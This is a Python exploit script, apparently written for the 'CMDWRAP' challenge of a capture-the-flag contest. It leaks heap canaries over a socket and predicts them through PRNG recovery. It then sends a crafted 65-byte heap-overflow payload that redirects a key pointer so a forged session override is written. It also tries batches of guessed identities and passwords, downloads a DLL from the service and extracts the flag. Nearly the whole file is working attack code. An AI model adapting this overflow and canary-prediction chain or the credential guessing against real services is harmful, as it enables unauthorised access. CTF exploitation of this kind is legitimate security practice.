#!/usr/bin/env python3
"""Exploit chain's heap overflow to set CMDWRAP's one-shot catalog session.

Layout without invoking easy_load first:
  chunk 0: session catalog-session override (persistent)
  chunk 1: groomed stash note, later reused by chain
  chunk 2: flag_decode outer state (victim)
  chunk 3: flag_decode key buffer

The chain overflow changes only the low byte of outer->key from arena+0xd0 to
arena+0x10.  A later short `flag_decode newuser` then writes `newuser\0` into
the catalog override.  `easy_load cheat` consumes that override.
"""
import argparse
import pathlib
import re
import socket

import predict_canary as pc

PROMPT = b"cmdwrap> "


class Client:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), 8)
        self.s.settimeout(20)
        self.buf = b""
        self.recv()

    def recv(self):
        while PROMPT not in self.buf:
            block = self.s.recv(65536)
            if not block:
                raise EOFError("service disconnected")
            self.buf += block
        out, self.buf = self.buf.split(PROMPT, 1)
        return out

    def cmd(self, command):
        if isinstance(command, str):
            command = command.encode()
        self.s.sendall(command + b"\n")
        return self.recv()


def trailer_from_recall(output):
    raw = bytes.fromhex(re.sub(rb"[^0-9a-fA-F]", b"",
                               output.split(b"note 0:", 1)[1]).decode())
    if len(raw) != 64:
        raise RuntimeError(f"unexpected recall: {output!r}")
    return int.from_bytes(raw[56:58], "little")


def leak_once(c):
    if b"stored" not in c.cmd(b"stash 41"):
        raise RuntimeError("stash failed")
    value = trailer_from_recall(c.cmd(b"recall 0 64"))
    if b"dropped" not in c.cmd(b"stash purge 0"):
        raise RuntimeError("purge failed")
    return value


def load_direct(c, name, credential):
    out = c.cmd(b"add_capability " + name + b" " + credential)
    if b"capability loaded" not in out:
        raise RuntimeError(f"could not load {name!r}: {out!r}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="cmdwrap.chals.tisc26.ctf.sg")
    ap.add_argument("--port", type=int, default=4444)
    ap.add_argument("--leaks", type=int, default=40)
    ap.add_argument("--probe-identities", action="store_true")
    ap.add_argument("--identity", help="single catalog session override to try")
    ap.add_argument("--load-name", default="cheat",
                    help="single easy_load capability name for catalog comparison")
    ap.add_argument("--list-oracle", action="store_true",
                    help="reuse the redirected pointer to compare help catalogs")
    ap.add_argument("--matched-oracle", action="store_true",
                    help="try matching forged session/direct passwords")
    ap.add_argument("--rename-newuser", action="store_true",
                    help="test matching newuser auth for rename_session")
    ns = ap.parse_args()

    c = Client(ns.host, ns.port)
    load_direct(c, b"whoami", b"newuser")
    who = c.cmd(b"whoami")
    hit = re.search(rb"[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}", who, re.I)
    if not hit:
        raise RuntimeError(f"no UUID in whoami: {who!r}")
    uuid = hit.group(0)
    other_uuid = None
    if ns.probe_identities or ns.identity == "@other":
        other = Client(ns.host, ns.port)
        load_direct(other, b"whoami", b"newuser")
        other_hit = re.search(rb"[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}",
                              other.cmd(b"whoami"), re.I)
        if other_hit:
            other_uuid = other_hit.group(0)
    direct_names = [b"stash", b"recall", b"chain", b"flag_decode"]
    if ns.rename_newuser:
        direct_names.append(b"file_download")
    for name in direct_names:
        load_direct(c, name, uuid)
    # easy_load is another bootstrap capability: its loader password remains
    # `newuser`, but merely registering it does not allocate its arena state.
    load_direct(c, b"easy_load", b"newuser")

    observed = []
    for i in range(ns.leaks):
        observed.append(leak_once(c))
        print(f"\rleaks {i + 1}/{ns.leaks}", end="", flush=True)
    print()
    found = list(pc.candidates(observed))
    if len(found) != 1:
        raise RuntimeError(f"expected unique PRNG recovery, got {len(found)}")
    key, _initial, mixer, state = found[0]
    for _ in observed:
        _, state = pc.step(state)
    upcoming = pc.predict(key, mixer, state, 0, 4)
    print("next canaries=" + " ".join(f"{x:04x}" for x in upcoming))

    # Consume canary 0 while holding the predecessor chunk live.
    if b"stored" not in c.cmd(b"stash 41"):
        raise RuntimeError("groom stash failed")
    actual = trailer_from_recall(c.cmd(b"recall 0 64"))
    if actual != upcoming[0]:
        raise RuntimeError(f"prediction drift: {actual:04x} != {upcoming[0]:04x}")

    # First call allocates outer and key chunks (canaries 1 and 2).
    print(c.cmd(b"flag_decode A").decode(errors="backslashreplace"), end="")
    if b"dropped" not in c.cmd(b"stash purge 0"):
        raise RuntimeError("groom purge failed")

    chain_canary = upcoming[3].to_bytes(2, "little")
    forbidden = {0, 10, 13, 59}
    if any(x in forbidden for x in chain_canary):
        raise RuntimeError(f"unencodable predicted chain canary {upcoming[3]:04x}; reconnect")

    # 65 raw bytes, at least nine backslashes => logical allocation <= 56.
    payload = bytearray(b"no_such_cap ")
    payload += (b"\\A" * 22)
    payload = payload[:56].ljust(56, b"A")
    payload += chain_canary
    payload += b"BBBBBB"       # trailer size/flags are ignored by free
    payload += b"\x10"         # victim outer->key low byte: d0 -> 10
    assert len(payload) == 65 and payload.count(b"\\") >= 9
    overflow_out = c.cmd(b"chain " + payload)
    print("overflow=" + overflow_out.decode(errors="backslashreplace"), end="")

    if ns.list_oracle:
        identities = [
            (b"self", uuid), (b"newuser", b"newuser"), (b"admin", b"admin"),
            (b"root", b"root"), (b"system", b"system"),
            (b"singularity", b"singularity"), (b"cheat", b"cheat"),
            (b"flag", b"flag"), (b"debug", b"debug"),
            (b"internal", b"internal"), (b"966d4c77", b"966d4c77"),
            (b"blocked_uuid", b"a7c71911-8138-407f-b87f-9f0d0bcc7e14"),
            (b"dotdot", b".."), (b"slash_admin", b"../admin"),
            (b"backslash_admin", b"..\\admin"),
        ]
        for label, identity in identities:
            write_out = c.cmd(b"flag_decode " + identity)
            listing = c.cmd(b"help")
            print(f"LIST[{label.decode()}] write={write_out!r}")
            print(listing.decode("utf-8", "backslashreplace"), end="")
        return

    if ns.matched_oracle:
        identities = [
            b"newuser", b"admin", b"root", b"system", b"singularity",
            b"cheat", b"flag", b"debug", b"internal", b"cmdwrap",
            b"966d4c77", b"22EC5B25", b"blocker", b"master", b"guest", b"tisc",
        ]
        for identity in identities:
            write_out = c.cmd(b"flag_decode " + identity)
            result = c.cmd(b"add_capability cheat " + identity)
            print(f"MATCH[cheat/{identity.decode()}] write={write_out!r} result={result!r}")
            low = result.lower()
            if b"capability loaded" in low:
                print(f"INVOKE[cheat]={c.cmd(b'cheat')!r}")
                break
        for identity in (b"newuser", b"admin", b"singularity", b"rename_session"):
            write_out = c.cmd(b"flag_decode " + identity)
            result = c.cmd(b"add_capability rename_session " + identity)
            print(f"MATCH[rename_session/{identity.decode()}] write={write_out!r} result={result!r}")
            low = result.lower()
            if b"capability loaded" in low:
                print(f"INVOKE[rename_session]={c.cmd(b'rename_session')!r}")
                break
        return

    if ns.rename_newuser:
        write_out = c.cmd(b"flag_decode newuser")
        result = c.cmd(b"add_capability rename_session newuser")
        print(f"RENAME_AUTH write={write_out!r} result={result!r}")
        if b"capability loaded" not in result.lower():
            return
        download = c.cmd(b"file_download rename_session.dll")
        print(f"RENAME_DOWNLOAD bytes={len(download)} prefix={download[:120]!r}")
        match = re.search(rb"\[file_download\] rename_session\.dll begin (\d+)\r?\n", download)
        if match:
            size = int(match.group(1))
            start = match.end()
            dll = download[start:start + size]
            path = pathlib.Path(__file__).parents[1] / "remote" / "dll" / "rename_session.dll"
            path.write_bytes(dll)
            print(f"RENAME_SAVED path={path} size={len(dll)}")
        invoke = c.cmd(b"rename_session TEST")
        print(f"RENAME_INVOKE result={invoke!r}")
        return

    # This now lands in chunk 0 and is NUL-terminated by flag_decode.
    selected = ns.identity.encode() if ns.identity else b"newuser"
    if selected == b"@other":
        selected = other_uuid
    elif selected == b"@self":
        selected = uuid
    tokens = [selected]
    if ns.probe_identities and not ns.identity:
        tokens = [
            uuid, other_uuid, b"newuser", b"admin", b"administrator", b"root",
            b"system", b"internal", b"debug", b"0", b"1", b"true", b"%00",
            b"newuser&password=newuser", b"x&session=newuser",
        ]
    for token in filter(None, tokens):
        print(f"override={token!r}")
        print(c.cmd(b"flag_decode " + token).decode(errors="backslashreplace"), end="")
        load_name = ns.load_name.encode("ascii")
        result = c.cmd(b"easy_load " + load_name)
        print("easy_load " + ns.load_name + "=" + result.decode(errors="backslashreplace"), end="")
        if b"capability loaded" not in result:
            continue
        out = c.cmd(load_name)
        print(ns.load_name + "=" + out.decode(errors="backslashreplace"), end="")
        flag = re.search(rb"(?:TISC|flag)\{[^}\r\n]+\}", out, re.I)
        if flag:
            print("FLAG=" + flag.group(0).decode())
        break


if __name__ == "__main__":
    main()
